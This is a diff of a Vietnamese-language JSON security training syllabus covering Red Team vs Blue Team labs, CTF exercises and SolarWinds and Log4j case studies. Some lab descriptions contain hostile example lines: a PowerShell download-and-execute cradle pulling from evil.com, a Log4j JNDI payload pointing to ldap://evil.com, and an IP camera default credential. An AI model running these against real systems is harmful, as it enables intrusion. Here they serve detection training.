+        "description": "Cài Sysmon (`sysmon -i sysmonconfig.xml`), chạy Mimikatz giả lập, phân tích log (`Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' | Where-Object {$_.Id -eq 1}`), tìm dấu hiệu (mimikatz.exe, PID). Blue Team đề xuất cách ly."
+      },
+      {
+        "id": 3,
+        "title": "Thực hành Atomic Red Team",
+        "description": "Chạy kịch bản T1059 (`powershell IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')`), Blue Team xây playbook trong Splunk SOAR (chặn IP, kill process), kiểm tra hiệu quả phản ứng."
+      },
+      {
+        "id": 4,
+        "title": "Mô phỏng tấn công vào thiết bị IoT",
+        "description": "Red Team khai thác camera IP (nmap tìm port 554, dùng default credential admin:12345), Blue Team phát hiện qua log firewall (`iptables -L`), chặn IP tấn công (`iptables -A INPUT -s 203.0.113.5 -j DROP`)."
+      }
     ],
-    "expectedResult": "Học viên hiểu quy trình tấn công – phòng thủ, phát triển kỹ năng phân tích và đề xuất giải pháp kịp thời.",
+    "expectedResult": "Học viên hiểu rõ TTPs của kẻ tấn công, thực hiện mô phỏng tấn công bằng Metasploit, phòng thủ bằng Sysmon/EDR, và phát triển kỹ năng phản ứng nhanh trong các kịch bản Red Team vs Blue Team, bao gồm cả IoT.",
     "icon": "Target"
   },
   "7": {
     "title": "CAPTURE THE FLAG (CTF) & CASE STUDIES",
     "level": "Senior",
-    "objective": "Tích hợp kiến thức qua CTF và phân tích case study thực tế.",
+    "objective": "Tích hợp toàn bộ kiến thức qua các bài tập CTF và phân tích case study thực tế để nâng cao kỹ năng ứng dụng. Học viên sẽ thực hành giải CTF, phân tích các vụ tấn công lớn (SolarWinds, Log4j), và đề xuất giải pháp cải thiện bảo mật.",
     "theory": [
-      {"text": "Tổng kết qua case study: SolarWinds (chuỗi cung ứng, 2024), Log4j (vẫn khai thác, 2025), Hafnium."},
-      {"text": "Bài học: Quản lý chuỗi cung ứng, phát hiện sớm lỗ hổng."}
+      {
+        "text": "**Tổng kết qua case study**: SolarWinds (2024) - tấn công chuỗi cung ứng qua Orion update, cài backdoor Sunburst; Log4j (2025) - lỗ hổng RCE (CVE-2021-44228) vẫn bị khai thác qua `${jndi:ldap}`; Hafnium (2021) - tấn công Exchange Server qua ProxyLogon. Ví dụ: SolarWinds dùng DLL độc hại để liên lạc C2 qua HTTPS."
+      },
+      {
+        "text": "**Bài học**: Quản lý chuỗi cung ứng (kiểm tra vendor, hash file), phát hiện sớm zero-day (SIEM rule cho hành vi bất thường), cải tiến SIEM (tích hợp threat intelligence). Ví dụ: Phát hiện Log4j qua log chứa chuỗi `${jndi}`."
+      }
     ],
     "labs": [
-      {"id": 1, "title": "Tham gia CTF", "description": "Phân tích log, xác định dấu hiệu tấn công (ví dụ: shellcode trong log IIS)."},
-      {"id": 2, "title": "Soạn báo cáo phân tích case study SolarWinds", "description": "Với khuyến nghị cải tiến SIEM."},
-      {"id": 3, "title": "Thảo luận nhóm", "description": "So sánh kết quả, rút bài học và đề xuất giải pháp bảo mật."}
+      {
+        "id": 1,
+        "title": "Tham gia bài tập CTF",
+        "description": "Phân tích log IIS (`C:\\inetpub\\logs`), tìm shellcode injection (`GET /page?x=malicious_code`), dùng Wireshark bắt gói tin (tìm flag trong payload HTTP), giải mã base64 (`echo 'Q1RGe2ZsYWd9' | base64 -d` → CTF{flag})."
+      },
+      {
+        "id": 2,
+        "title": "Soạn báo cáo phân tích case study SolarWinds",
+        "description": "Phân tích log giả lập (DLL bất thường: orion.dll), đề xuất SIEM rule (`index=main dll_loaded=*.dll | where hash != known_good`), khuyến nghị (kiểm tra hash update, bật EDR). Học viên nộp báo cáo PDF."
+      },
+      {
+        "id": 3,
+        "title": "Thảo luận nhóm về case study",
+        "description": "Nhóm 4-5 người phân tích Log4j log (`${jndi:ldap://evil.com/a}`), so sánh cách phát hiện (SIEM vs EDR), đề xuất giải pháp (vá Log4j, chặn outbound LDAP), trình bày kết quả trong 10 phút."
+      }
     ],
-    "expectedResult": "Học viên ứng dụng kiến thức vào thực tiễn, soạn báo cáo chuyên nghiệp và cải thiện hệ thống bảo mật.",
+    "expectedResult": "Học viên áp dụng kiến thức từ mạng, SIEM, malware vào giải CTF và phân tích case study, soạn báo cáo chuyên nghiệp với IOC và khuyến nghị, đồng thời cải thiện hệ thống bảo mật dựa trên bài học thực tế từ SolarWinds, Log4j.",
     "icon": "Trophy"
   }
 }
